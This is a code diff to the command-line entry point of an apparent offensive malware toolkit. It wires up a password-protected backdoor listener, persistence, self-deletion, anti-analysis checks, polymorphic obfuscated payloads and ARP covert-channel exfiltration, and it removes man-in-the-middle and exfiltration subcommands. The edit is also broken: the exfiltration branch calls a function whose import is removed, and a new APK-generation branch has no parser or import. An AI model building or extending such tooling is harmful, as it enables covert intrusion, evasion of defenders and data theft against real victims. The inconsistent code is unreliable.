@@ -1,7 +1,6 @@
 import argparse
 import logging
 import sys
-import argcomplete
 import json
 import threading
 import os
@@ -16,11 +15,9 @@ from modules.system import add_persistence, mimic_system_tool, self_delete
 from modules.scanner import intelligent_scan
 from modules.anti_analysis import run_anti_analysis_checks
 from modules.discovery import discover_files
-from modules.mitm import start_arp_spoof
 from modules.wizard import encode_wizard
 from modules.covert_channel import send_arp_covert, listen_arp_covert
 from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
-from modules.ace import ace_exfiltrate
 
 def load_config(config_path='config.json'):
     """Load configuration from a JSON file."""
@@ -115,17 +112,10 @@ def main():
     scan_parser.add_argument("--subnet", required=True, help="Subnet to scan (e.g., 192.168.1.)")
     scan_parser.add_argument("--ports", nargs='+', type=int, help="Specific ports to scan (optional)")
 
-    # MITM
-    mitm_parser = subparsers.add_parser("mitm", help="Perform a Man-in-the-Middle attack")
-    mitm_parser.add_argument("--target", required=True, help="Target IP address")
-    mitm_parser.add_argument("--gateway", required=True, help="Gateway IP address")
-
     # Backdoor
     backdoor_parser = subparsers.add_parser("backdoor", help="Start the backdoor listener")
     backdoor_parser.add_argument("--port", type=int, default=5555, help="Port for the backdoor to listen on")
     backdoor_parser.add_argument("--password", required=True, help="Password for the backdoor")
-
-    argcomplete.autocomplete(parser)
 
     # Covert Channel
     send_arp_parser = subparsers.add_parser("send-arp", help="Send data via ARP covert channel")
@@ -143,11 +133,6 @@ def main():
     # Wizard
     wizard_parser = subparsers.add_parser("wizard", help="Run an interactive wizard")
     wizard_parser.add_argument("--mode", required=True, choices=['encode'], help="Wizard mode to run")
-
-    # ACE
-    ace_parser = subparsers.add_parser("ace-exfiltrate", help="Use the ACE engine to exfiltrate data")
-    ace_parser.add_argument("--target", required=True, help="Target IP or domain")
-    ace_parser.add_argument("--data", required=True, help="Data to exfiltrate")
 
     args = parser.parse_args()
 
@@ -229,11 +214,11 @@ def main():
                 payload = generate_payload(
                     payload_type=args.type,
                     length=args.length,
-                data=args.data,
-                obfuscate=args.obfuscate,
-                obfuscate_method=args.obfuscate_method,
-                morph=args.morph
-            )
+                    data=args.data,
+                    obfuscate=args.obfuscate,
+                    obfuscate_method=args.obfuscate_method,
+                    morph=args.morph
+                )
             if args.output_file:
                 with open(args.output_file, 'wb') as f:
                     f.write(payload)
@@ -285,6 +270,9 @@ def main():
 
         elif args.command == "ace-exfiltrate":
             ace_exfiltrate(args.data.encode(), args.target)
+
+        elif args.command == "generate-apk":
+            generate_apk(args.output)
 
     except Exception as e:
         logging.error(f"An error occurred: {e}", exc_info=args.verbose)
